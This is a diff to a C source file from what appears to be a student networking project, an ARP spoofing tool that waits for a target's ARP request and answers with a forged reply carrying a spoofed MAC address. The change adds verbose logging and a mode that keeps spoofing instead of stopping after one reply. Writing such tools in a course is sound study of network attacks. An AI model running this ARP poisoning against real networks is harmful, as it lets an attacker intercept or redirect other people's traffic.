@@ -6,7 +6,7 @@
 /*   By: eric <eric@student.42.fr>                  +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2026/04/17 13:53:15 by eric              #+#    #+#             */
-/*   Updated: 2026/04/22 12:02:41 by eric             ###   ########.fr       */
+/*   Updated: 2026/04/22 13:19:28 by eric             ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -20,7 +20,8 @@ void	sniff_arp(int sockfd, const char *iface, const t_config *conf)
 	while (!g_signal)
 	{
 		len = recvfrom(sockfd, buffer, BUFFER_SIZE, 0, NULL, NULL);
-		// printf("recv: %ld\n", len);
+		if (conf->verbose)
+			printf("[VERBOSE] Received %ld bytes\n", len);
 	 	if (len < (ssize_t)sizeof(t_ethernet))
         	continue;
 		t_ethernet *eth = (t_ethernet *)buffer;
@@ -31,8 +32,11 @@ void	sniff_arp(int sockfd, const char *iface, const t_config *conf)
 		&& ft_memcmp(arp->target_ip, conf->spoof_ip, 4) == 0 
 		&& ft_memcmp(arp->sender_ip, conf->target_ip, 4) == 0)
 		{
+			if (conf->verbose)
+				printf("[VERBOSE] ARP request detected from target\n");
     		send_arp_reply(sockfd, iface, arp, conf);
-    		return;
+    		if (!conf->continuous)
+    			return;
 		}
 	}
 }
@@ -45,17 +49,16 @@ int	send_arp_reply(int sockfd, const char *iface, t_arp *arp, const t_config *co
 
 	eth = (t_ethernet *)buffer;
 	reply = (t_arp *)(buffer + sizeof(t_ethernet));
-
+	if (conf->verbose)
+		printf("[VERBOSE] Building ARP reply packet\n");
 	ft_memcpy(eth->dst_mac, arp->sender_mac, 6);
 	ft_memcpy(eth->src_mac, conf->spoof_mac, 6);
 	eth->type = htons(0x0806);
-	
 	reply->htype = htons(1);
 	reply->ptype = htons(0x0800);
 	reply->hlen = 6;
 	reply->plen = 4;
 	reply->opcode = htons(2);
-
 	// Sender of reply = spoofed MAC/IP
 	ft_memcpy(reply->sender_mac, conf->spoof_mac, 6);
 	ft_memcpy(reply->sender_ip, conf->spoof_ip, 4);
@@ -74,7 +77,8 @@ int	send_arp_reply(int sockfd, const char *iface, t_arp *arp, const t_config *co
 	}
 	sll.sll_halen = 6;
 	ft_memcpy(sll.sll_addr, reply->target_mac, 6);
-
+	if (conf->verbose)
+		printf("[VERBOSE] Sending ARP reply packet\n");
 	if (sendto(sockfd, buffer, sizeof(buffer), 0, (struct sockaddr *)&sll, sizeof(sll)) < 0)
 	{
 		fprintf(stderr, "Error in sendto\n");
